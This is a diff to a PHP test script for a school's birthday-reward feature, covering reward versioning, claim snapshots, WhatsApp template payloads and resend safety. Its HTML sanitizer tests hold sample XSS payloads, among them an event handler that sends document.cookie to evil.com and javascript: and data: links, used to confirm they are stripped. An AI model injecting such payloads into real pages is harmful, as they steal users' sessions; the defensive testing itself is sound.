@@ -713,11 +713,17 @@ $pdo->exec("
         created_at TEXT DEFAULT CURRENT_TIMESTAMP,
         updated_at TEXT DEFAULT CURRENT_TIMESTAMP
     );
-    INSERT OR REPLACE INTO communication_templates (template_name, channel, status, meta_data)
+");
+try {
+    $pdo->exec("ALTER TABLE communication_templates ADD COLUMN category TEXT DEFAULT 'MARKETING'");
+} catch (Exception $e) {}
+$pdo->exec("
+    INSERT OR REPLACE INTO communication_templates (template_name, channel, status, category, meta_data)
     VALUES (
         'pepp_birthday_greeting',
         'whatsapp',
         'approved',
+        'MARKETING',
         '{\"components\":[{\"type\":\"HEADER\",\"format\":\"IMAGE\"},{\"type\":\"BODY\",\"text\":\"Dear {{1}}, claim {{2}}\"}]}'
     );
     INSERT OR REPLACE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
@@ -987,6 +993,444 @@ $finalStatus = $reCheckStmt->fetchColumn();
 $pdo->prepare("DELETE FROM birthday_notifications_sent WHERE person_identity = ?")->execute([$testPid]);
 $pdo->prepare("DELETE FROM communication_queue WHERE id IN (9991, ?)")->execute([$newQueueId]);
 $pdo->prepare("DELETE FROM users WHERE user_id = ?")->execute([$testUid]);
+
+// ════════════════════════════════════════════════════════════════════════
+// 13. PHASE 2: REWARD SNAPSHOT, VERSIONING, SANITIZATION & PERMANENT INSTRUCTIONS
+// ════════════════════════════════════════════════════════════════════════
+echo "\n── 13. Phase 2: Reward Snapshot, Versioning, Sanitizer & WhatsApp ──\n";
+
+// 1. Table existence & schema
+$vTableExists = (bool)$pdo->query("SELECT 1 FROM sqlite_master WHERE type='table' AND name='birthday_reward_versions'")->fetchColumn();
+$vTableExists
+    ? test_pass("Table 'birthday_reward_versions' exists")
+    : test_fail("Table 'birthday_reward_versions' missing");
+
+$vCols = array_column($pdo->query("PRAGMA table_info(birthday_reward_versions)")->fetchAll(PDO::FETCH_ASSOC), 'name');
+foreach (['version_number', 'reward_title', 'coupon_code', 'valid_till', 'instructions', 'terms', 'claim_message', 'created_at', 'created_by'] as $col) {
+    in_array($col, $vCols, true)
+        ? test_pass("birthday_reward_versions has '{$col}' column")
+        : test_fail("birthday_reward_versions missing '{$col}' column");
+}
+
+$cCols = array_column($pdo->query("PRAGMA table_info(birthday_reward_claims)")->fetchAll(PDO::FETCH_ASSOC), 'name');
+foreach (['reward_version_id', 'reward_title', 'coupon_code', 'coupon_valid_till', 'instructions', 'terms', 'claim_message', 'instruction_token', 'claim_whatsapp_status'] as $col) {
+    in_array($col, $cCols, true)
+        ? test_pass("birthday_reward_claims has snapshot column '{$col}'")
+        : test_fail("birthday_reward_claims missing snapshot column '{$col}'");
+}
+
+// 2. Allowlist-based HTML Sanitizer (sanitize_reward_html)
+echo "  [HTML Sanitizer Security Verification]\n";
+$safeInput = "<p>Congratulations! <strong>Enjoy</strong> your <em>special</em> <u>day</u>.</p><h3>How to redeem</h3><ul><li>Step 1</li><li>Step 2</li></ul>";
+$sanitized = sanitize_reward_html($safeInput);
+(strpos($sanitized, '<strong>Enjoy</strong>') !== false && strpos($sanitized, '<ul><li>Step 1</li>') !== false && strpos($sanitized, '<h3>') !== false)
+    ? test_pass("Sanitizer preserves safe tags (p, strong, em, u, h3, ul, li)")
+    : test_fail("Sanitizer stripped legitimate safe tags", $sanitized);
+
+$xssScript = "<p>Hello <script>alert('pwned')</script>Student</p>";
+$sanScript = sanitize_reward_html($xssScript);
+(strpos($sanScript, '<script') === false && strpos($sanScript, 'alert') === false && strpos($sanScript, 'Hello Student') !== false)
+    ? test_pass("Sanitizer strips <script> tags and inner malicious content")
+    : test_fail("Sanitizer allowed script tag", $sanScript);
+
+$xssAttr = "<p onmouseover=\"fetch('https://evil.com/steal?c='+document.cookie)\" onclick=\"alert(1)\">Hover me</p>";
+$sanAttr = sanitize_reward_html($xssAttr);
+(strpos($sanAttr, 'onmouseover') === false && strpos($sanAttr, 'onclick') === false && strpos($sanAttr, 'Hover me') !== false)
+    ? test_pass("Sanitizer strips on* event handlers completely")
+    : test_fail("Sanitizer allowed event handler", $sanAttr);
+
+$xssJsLink = "<a href=\"javascript:alert('xss')\">Click for reward</a>";
+$sanJsLink = sanitize_reward_html($xssJsLink);
+(strpos($sanJsLink, 'javascript:') === false)
+    ? test_pass("Sanitizer rejects javascript: URI scheme in links")
+    : test_fail("Sanitizer allowed javascript: scheme", $sanJsLink);
+
+$xssDataLink = "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Click</a>";
+$sanDataLink = sanitize_reward_html($xssDataLink);
+(strpos($sanDataLink, 'data:') === false)
+    ? test_pass("Sanitizer rejects data: URI scheme in links")
+    : test_fail("Sanitizer allowed data: scheme", $sanDataLink);
+
+$safeLink = "<a href=\"https://pepplearning.in/admissions\" target=\"_blank\">Official PEPP Site</a>";
+$sanSafeLink = sanitize_reward_html($safeLink);
+(strpos($sanSafeLink, 'https://pepplearning.in/admissions') !== false)
+    ? test_pass("Sanitizer allows valid https:// links")
+    : test_fail("Sanitizer broke valid https link", $sanSafeLink);
+
+$xssIframe = "<p>Watch this video: <iframe src=\"https://evil.com\"></iframe><embed src=\"evil.swf\"><object data=\"evil.pdf\"></object></p>";
+$sanIframe = sanitize_reward_html($xssIframe);
+(strpos($sanIframe, '<iframe') === false && strpos($sanIframe, '<embed') === false && strpos($sanIframe, '<object') === false)
+    ? test_pass("Sanitizer rejects iframe, embed, and object elements")
+    : test_fail("Sanitizer allowed iframe/embed/object", $sanIframe);
+
+$xssStyle = "<p style=\"color:red; background:url(javascript:alert(1))\">Styled text</p>";
+$sanStyle = sanitize_reward_html($xssStyle);
+(strpos($sanStyle, 'style=') === false && strpos($sanStyle, 'Styled text') !== false)
+    ? test_pass("Sanitizer strips unsafe style attributes")
+    : test_fail("Sanitizer allowed style attribute", $sanStyle);
+
+// 3. Reward Versioning Rules
+echo "  [Reward Versioning Rules Verification]\n";
+// Clean versions table for test
+$pdo->exec("DELETE FROM birthday_reward_versions");
+
+// Initial version creation
+$initialData = [
+    'reward_title'          => 'Initial PEPP Birthday Reward',
+    'reward_description'    => 'Get 25% discount',
+    'coupon_code'           => 'BDAY25',
+    'valid_till'            => '2026-12-31',
+    'instructions'          => '<p>Redeem at admissions office</p>',
+    'terms'                 => '<p>One time use only</p>',
+    'claim_message'         => '<p>Your reward is ready!</p>',
+    'birthday_header_image' => 'uploads/birthday/header.jpg',
+    'reward_voucher_image'  => 'uploads/birthday/voucher.jpg',
+    'is_active'             => 1
+];
+
+// Seed settings with initialData
+$pdo->prepare("
+    UPDATE birthday_reward_settings SET
+        reward_title = ?, reward_description = ?, coupon_code = ?, valid_till = ?,
+        instructions = ?, terms = ?, claim_message = ?,
+        birthday_header_image = ?, reward_voucher_image = ?, is_active = 1
+    WHERE id = 1
+")->execute([
+    $initialData['reward_title'], $initialData['reward_description'], $initialData['coupon_code'], $initialData['valid_till'],
+    $initialData['instructions'], $initialData['terms'], $initialData['claim_message'],
+    $initialData['birthday_header_image'], $initialData['reward_voucher_image']
+]);
+
+$v1 = get_or_create_current_reward_version($pdo, 'admin_test');
+($v1 && (int)$v1['version_number'] === 1 && $v1['coupon_code'] === 'BDAY25')
+    ? test_pass("Initial reward content creates Version 1")
+    : test_fail("Initial version creation failed");
+
+// Toggle is_active only -> MUST NOT create a new version
+$toggleData = $initialData;
+$toggleData['is_active'] = 0;
+$resToggle = record_reward_version_if_changed($pdo, $toggleData, 'admin_test');
+$vToggle = get_or_create_current_reward_version($pdo);
+($resToggle === null && (int)$vToggle['version_number'] === 1)
+    ? test_pass("Toggling is_active (ON/OFF) does NOT create a new version")
+    : test_fail("Toggling is_active created new version");
+
+// Change meaningful field (e.g. coupon_code) -> MUST create Version 2
+$changeData = $initialData;
+$changeData['coupon_code'] = 'BDAY50_SUPER';
+$v2Id = record_reward_version_if_changed($pdo, $changeData, 'admin_test');
+$v2 = get_or_create_current_reward_version($pdo);
+($v2Id !== null && (int)$v2['version_number'] === 2 && $v2['coupon_code'] === 'BDAY50_SUPER')
+    ? test_pass("Meaningful content change (coupon_code) creates Version 2")
+    : test_fail("Content change did not create Version 2");
+
+// Change instructions HTML -> MUST create Version 3
+$changeHtmlData = $changeData;
+$changeHtmlData['instructions'] = '<p>Updated instructions for 2026-27</p>';
+$v3Id = record_reward_version_if_changed($pdo, $changeHtmlData, 'admin_test');
+$v3 = get_or_create_current_reward_version($pdo);
+($v3Id !== null && (int)$v3['version_number'] === 3 && strpos($v3['instructions'], 'Updated instructions') !== false)
+    ? test_pass("Meaningful content change (instructions HTML) creates Version 3")
+    : test_fail("Instructions change did not create Version 3");
+
+// Identical content -> returns null without creating Version 4
+$sameData = $changeHtmlData;
+$vSameRes = record_reward_version_if_changed($pdo, $sameData, 'admin_test');
+$vSame = get_or_create_current_reward_version($pdo);
+($vSameRes === null && (int)$vSame['version_number'] === 3)
+    ? test_pass("Submitting identical content retains current version without incrementing")
+    : test_fail("Identical content created redundant version");
+
+// 4. Permanent Instruction Token Generation
+$t1 = generate_instruction_token();
+$t2 = generate_instruction_token();
+(strlen($t1) === 32 && ctype_xdigit($t1) && $t1 !== $t2)
+    ? test_pass("generate_instruction_token() generates unique 32-char hex string")
+    : test_fail("Invalid instruction token generated");
+
+// 5. Atomic Claim Transaction & Snapshot Immutability
+echo "  [Atomic Claim & Snapshot Immutability Verification]\n";
+$snapPid = '919999000111';
+$snapUid = 'PEPP2026SNAP1';
+$snapBday = date('Y-m-d');
+
+// Sync current settings to Version 3
+$pdo->prepare("
+    UPDATE birthday_reward_settings SET
+        reward_title = ?, reward_description = ?, coupon_code = ?, valid_till = ?,
+        instructions = ?, terms = ?, claim_message = ?, is_active = 1
+    WHERE id = 1
+")->execute([
+    $v3['reward_title'], $v3['reward_description'], $v3['coupon_code'], $v3['valid_till'],
+    $v3['instructions'], $v3['terms'], $v3['claim_message']
+]);
+
+// Clean any previous test claim
+$pdo->prepare("DELETE FROM birthday_reward_claims WHERE person_identity = ?")->execute([$snapPid]);
+
+// Simulate atomic claim creation with snapshot
+$snapToken = generate_instruction_token();
+$claimInsertStmt = $pdo->prepare("
+    INSERT INTO birthday_reward_claims (
+        person_identity, student_id, birthday_date, claimed_at,
+        reward_version_id, reward_title, reward_description,
+        coupon_code, coupon_valid_till, instructions, terms, claim_message,
+        voucher_image, instruction_token,
+        claim_whatsapp_status
+    ) VALUES (
+        ?, ?, ?, CURRENT_TIMESTAMP,
+        ?, ?, ?,
+        ?, ?, ?, ?, ?,
+        ?, ?,
+        'not_queued'
+    )
+");
+$claimInsertStmt->execute([
+    $snapPid, $snapUid, $snapBday,
+    $v3['id'], $v3['reward_title'], $v3['reward_description'],
+    $v3['coupon_code'], $v3['valid_till'], $v3['instructions'], $v3['terms'], $v3['claim_message'],
+    $v3['reward_voucher_image'], $snapToken
+]);
+
+$savedClaim = get_birthday_claim_by_token($pdo, $snapToken);
+($savedClaim && $savedClaim['coupon_code'] === 'BDAY50_SUPER' && $savedClaim['reward_version_id'] == $v3['id'])
+    ? test_pass("Claim record successfully captured immutable snapshot matching Version 3")
+    : test_fail("Claim record failed to capture snapshot");
+
+// MUTATE current settings (e.g. Admin changes coupon to BDAY2028 and valid_till to 2028-12-31)
+$pdo->prepare("
+    UPDATE birthday_reward_settings SET
+        reward_title = 'Future Reward 2028',
+        coupon_code = 'MUTATED_NEW_COUPON_2028',
+        valid_till = '2028-12-31',
+        instructions = '<p>Totally different instructions</p>'
+    WHERE id = 1
+")->execute();
+
+// Re-read claimed student's snapshot
+$reloadedClaim = get_birthday_claim_by_token($pdo, $snapToken);
+($reloadedClaim['coupon_code'] === 'BDAY50_SUPER' && $reloadedClaim['coupon_code'] !== 'MUTATED_NEW_COUPON_2028')
+    ? test_pass("IMMUTABILITY: Claimed student's coupon code remains unchanged after admin settings update")
+    : test_fail("Claimed coupon mutated when admin settings were updated!", $reloadedClaim['coupon_code']);
+
+($reloadedClaim['instructions'] === $v3['instructions'] && strpos($reloadedClaim['instructions'], 'Totally different') === false)
+    ? test_pass("IMMUTABILITY: Claimed student's instructions remain unchanged after admin settings update")
+    : test_fail("Claimed instructions mutated when admin settings were updated!");
+
+// 6. Permanent Instruction URL Resolution
+echo "  [Permanent Instruction Page Access Verification]\n";
+$claimLookupByToken = get_birthday_claim_by_token($pdo, $snapToken);
+($claimLookupByToken && $claimLookupByToken['person_identity'] === $snapPid)
+    ? test_pass("get_birthday_claim_by_token() correctly resolves claim by token")
+    : test_fail("get_birthday_claim_by_token() failed to resolve valid claim");
+
+$invalidLookup = get_birthday_claim_by_token($pdo, 'invalid_non_existent_token_12345');
+($invalidLookup === null)
+    ? test_pass("get_birthday_claim_by_token() returns null for invalid token (no IDOR / leak)")
+    : test_fail("get_birthday_claim_by_token() did not return null for invalid token");
+
+// 7. Communication Event Registration & Meta Template Support
+echo "  [Communication Event & WhatsApp Payload Verification]\n";
+$tplFileContent = file_get_contents(__DIR__ . '/communication-templates.php');
+(strpos($tplFileContent, "'birthday_reward_claimed'") !== false)
+    ? test_pass("'birthday_reward_claimed' event registered in communication-templates.php")
+    : test_fail("'birthday_reward_claimed' not registered in communication-templates.php");
+
+$claimedEventCheck = $pdo->prepare("
+    INSERT OR REPLACE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
+    VALUES ('birthday_reward_claimed', 'pepp_birthday_reward_claimed', '[]')
+");
+$claimedEventCheck->execute();
+$hasEventInDb = (bool)$pdo->query("SELECT 1 FROM communication_event_mappings WHERE event_name = 'birthday_reward_claimed'")->fetchColumn();
+$hasEventInDb
+    ? test_pass("'birthday_reward_claimed' event present in communication_event_mappings table")
+    : test_fail("'birthday_reward_claimed' missing from communication_event_mappings table");
+
+// 8. CommunicationEngine Template Resolution & URL Button No-Collision
+// Insert mock Meta template with Body {{1}}, {{2}}, {{3}} and dynamic URL Button {{1}}
+// Canonical Meta Category: MARKETING (as recommended and validated by Meta during template creation)
+$pdo->prepare("DELETE FROM communication_templates WHERE template_name = 'pepp_birthday_reward_claimed'")->execute();
+$pdo->prepare("
+    INSERT INTO communication_templates (template_name, channel, status, category, meta_data)
+    VALUES (
+        'pepp_birthday_reward_claimed',
+        'whatsapp',
+        'approved',
+        'MARKETING',
+        ?
+    )
+")->execute([json_encode([
+    'components' => [
+        [
+            'type' => 'BODY',
+            'text' => "🎁 Your PEPP Birthday Reward is Ready!\n\nDear *{{1}}*,\n\nYour birthday reward has been successfully claimed.\n\n🎟️ Coupon Code: *{{2}}*\n📅 Valid Until: *{{3}}*\n\nTeam PEPP Learning"
+        ],
+        [
+            'type' => 'BUTTONS',
+            'buttons' => [
+                [
+                    'type' => 'URL',
+                    'text' => 'Read Instructions',
+                    'url' => 'https://pepplearning.in/admissions/birthday-instructions.php/{{1}}'
+                ]
+            ]
+        ]
+    ]
+])]);
+
+// Verify canonical template category is strictly MARKETING and never assumed as UTILITY
+$tplRow = $pdo->query("SELECT category FROM communication_templates WHERE template_name = 'pepp_birthday_reward_claimed'")->fetch(PDO::FETCH_ASSOC);
+(($tplRow['category'] ?? '') === 'MARKETING')
+    ? test_pass("Canonical category for 'pepp_birthday_reward_claimed' is strictly MARKETING (not Utility)")
+    : test_fail("Template category mismatch: expected MARKETING, got " . ($tplRow['category'] ?? 'null'));
+
+// Insert test event mapping for birthday_reward_claimed with body variables and URL button
+$pdo->prepare("
+    INSERT OR REPLACE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
+    VALUES ('birthday_reward_claimed', 'pepp_birthday_reward_claimed', ?)
+")->execute([json_encode([
+    '1' => ['type' => 'variable', 'value' => 'student_name'],
+    '2' => ['type' => 'variable', 'value' => 'coupon_code'],
+    '3' => ['type' => 'variable', 'value' => 'valid_until']
+])]);
+
+$engine = CommunicationEngine::getInstance($pdo);
+$claimContext = [
+    'student_name'      => 'Amina Test',
+    'coupon_code'       => 'BDAY50_SUPER',
+    'valid_until'       => '31 Dec 2026',
+    'instruction_token' => $snapToken,
+    'instruction_url'   => 'https://pepplearning.in/admissions/birthday-instructions.php/' . $snapToken
+];
+
+$resolved = $engine->resolveEventTemplate('birthday_reward_claimed', $claimContext);
+($resolved !== null)
+    ? test_pass("resolveEventTemplate() successfully resolves 'birthday_reward_claimed'")
+    : test_fail("Failed to resolve 'birthday_reward_claimed'");
+
+// Build final WhatsApp payload via provider
+require_once __DIR__ . '/includes/communication/Providers/WhatsAppCloudProvider.php';
+$provider = new WhatsAppCloudProvider('test_biz', 'test_phone', 'test_token');
+$payload = $provider->buildMessagePayload('919876543210', 'Birthday Claim', '', '', [], $resolved);
+
+$bodyComp = null;
+$buttonComp = null;
+if (!empty($payload['template']['components'])) {
+    foreach ($payload['template']['components'] as $comp) {
+        if ($comp['type'] === 'body') {
+            $bodyComp = $comp;
+        }
+        if ($comp['type'] === 'button') {
+            $buttonComp = $comp;
+        }
+    }
+}
+
+($bodyComp !== null && count($bodyComp['parameters']) === 3)
+    ? test_pass("Meta payload Body component contains exactly 3 variables (name, coupon, validity)")
+    : test_fail("Meta body parameter count mismatch");
+
+// Verify body parameters match values
+$bodyParams = $bodyComp['parameters'] ?? [];
+(($bodyParams[0]['text'] ?? '') === 'Amina Test' && ($bodyParams[1]['text'] ?? '') === 'BDAY50_SUPER' && ($bodyParams[2]['text'] ?? '') === '31 Dec 2026')
+    ? test_pass("Meta body parameters {{1}}, {{2}}, {{3}} mapped accurately without truncation")
+    : test_fail("Meta body parameter value mismatch");
+
+// Verify button component parameter matches instruction_token and has NO collision with body
+$btnParamText = $buttonComp['parameters'][0]['text'] ?? '';
+($buttonComp !== null && $btnParamText === $snapToken)
+    ? test_pass("Meta payload dynamic URL Button component contains instruction_token without body parameter collision")
+    : test_fail("Meta payload missing dynamic URL button with instruction_token");
+
+// 9. Post-Claim WhatsApp Resend Safety
+echo "  [Post-Claim WhatsApp Resend Safety Verification]\n";
+$claimTestRecord = get_birthday_claim_by_token($pdo, $snapToken);
+$dummyStudent = [
+    'user_id' => $snapUid,
+    'name' => 'Amina Test',
+    'whatsapp_number' => '9876543210',
+    'whatsapp_country_code' => '91',
+    'mobile_number' => '9876543210',
+    'email' => 'amina.test@example.com'
+];
+
+// Dispatch initial claim WhatsApp
+$claimQueueId = dispatch_birthday_claim_whatsapp($pdo, $claimTestRecord, $dummyStudent, $snapPid);
+(is_numeric($claimQueueId) && $claimQueueId > 0)
+    ? test_pass("dispatch_birthday_claim_whatsapp() successfully enqueued post-claim WhatsApp")
+    : test_fail("Failed to enqueue post-claim WhatsApp");
+
+// Check that claim record was updated with queue ID and status 'queued'
+$claimAfterQueue = get_birthday_claim_by_token($pdo, $snapToken);
+($claimAfterQueue['claim_whatsapp_queue_id'] == $claimQueueId && in_array($claimAfterQueue['claim_whatsapp_status'], ['queued', 'sent'], true))
+    ? test_pass("Claim record updated with queue ID and claim_whatsapp_status")
+    : test_fail("Claim record not updated with queue details");
+
+// Set queue item status to pending to verify active in-flight check
+$pdo->prepare("UPDATE communication_queue SET status = 'pending' WHERE id = ?")->execute([$claimQueueId]);
+
+// Resend while queued/in-flight must be rejected
+$reCheckClaim = $pdo->prepare("
+    SELECT c.*, q.status AS queue_status
+    FROM birthday_reward_claims c
+    LEFT JOIN communication_queue q ON c.claim_whatsapp_queue_id = q.id
+    WHERE c.instruction_token = ?
+");
+$reCheckClaim->execute([$snapToken]);
+$activeClaimRow = $reCheckClaim->fetch(PDO::FETCH_ASSOC);
+$qsActive = $activeClaimRow['queue_status'] ?? '';
+(in_array($qsActive, ['pending', 'queued', 'processing', 'scheduled'], true))
+    ? test_pass("Resend is blocked while initial claim message is queued/processing")
+    : test_fail("Resend was not recognized as queued");
+
+// Simulate failure of the initial claim WhatsApp
+$pdo->prepare("UPDATE communication_queue SET status = 'failed', error_message = 'Simulated timeout' WHERE id = ?")->execute([$claimQueueId]);
+$pdo->prepare("UPDATE birthday_reward_claims SET claim_whatsapp_status = 'failed' WHERE id = ?")->execute([$claimAfterQueue['id']]);
+
+// Now resend the failed claim WhatsApp
+$claimFailedRecord = get_birthday_claim_by_token($pdo, $snapToken);
+$resendQueueId = dispatch_birthday_claim_whatsapp($pdo, $claimFailedRecord, $dummyStudent, $snapPid);
+(is_numeric($resendQueueId) && $resendQueueId > 0 && $resendQueueId !== $claimQueueId)
+    ? test_pass("Failed claim WhatsApp resend generates brand NEW queue item ({$resendQueueId} != {$claimQueueId})")
+    : test_fail("Failed claim resend did not generate new queue ID");
+
+// Verify that resend NEVER alters claimed_at, coupon_code, or creates duplicate claim
+$claimAfterResend = get_birthday_claim_by_token($pdo, $snapToken);
+($claimAfterResend['claimed_at'] === $claimTestRecord['claimed_at'] && $claimAfterResend['coupon_code'] === 'BDAY50_SUPER')
+    ? test_pass("Resend preserves claimed_at, coupon_code, and never creates a second claim")
+    : test_fail("Resend mutated claim timestamp or coupon code!");
+
+// 10. Legacy Claim Handling
+echo "  [Legacy Claim Handling Verification]\n";
+$legacyPid = '919999000222';
+$legacyUid = 'PEPP2026LEGACY1';
+$legacyDate = date('Y-m-d');
+
+// Insert legacy claim (reward_version_id and instruction_token are NULL)
+$pdo->prepare("
+    INSERT INTO birthday_reward_claims (
+        person_identity, student_id, birthday_date, claimed_at
+    ) VALUES (
+        ?, ?, ?, '2025-05-15 10:30:00'
+    )
+")->execute([$legacyPid, $legacyUid, $legacyDate]);
+
+$loadedLegacy = get_birthday_claim_by_identity($pdo, $legacyPid, $legacyDate);
+($loadedLegacy && !empty($loadedLegacy['is_legacy']) && empty($loadedLegacy['instruction_token']))
+    ? test_pass("Legacy claim is explicitly detected with is_legacy=true")
+    : test_fail("Legacy claim was not marked as legacy");
+
+(empty($loadedLegacy['instructions']) && empty($loadedLegacy['terms']))
+    ? test_pass("Legacy claim does not fabricate historical instructions or terms")
+    : test_fail("Legacy claim fabricated non-existent historical instructions");
+
+// Clean up Phase 2 test records
+$pdo->prepare("DELETE FROM birthday_reward_claims WHERE person_identity IN (?, ?)")->execute([$snapPid, $legacyPid]);
+$pdo->prepare("DELETE FROM communication_queue WHERE id IN (?, ?)")->execute([$claimQueueId, $resendQueueId]);
+$pdo->prepare("DELETE FROM communication_event_mappings WHERE event_name = 'birthday_reward_claimed'")->execute();
+$pdo->prepare("DELETE FROM communication_templates WHERE template_name = 'pepp_birthday_reward_claimed'")->execute();
+$pdo->exec("DELETE FROM birthday_reward_versions");
+
 
 // ════════════════════════════════════════════════════════════════════════
 // SUMMARY
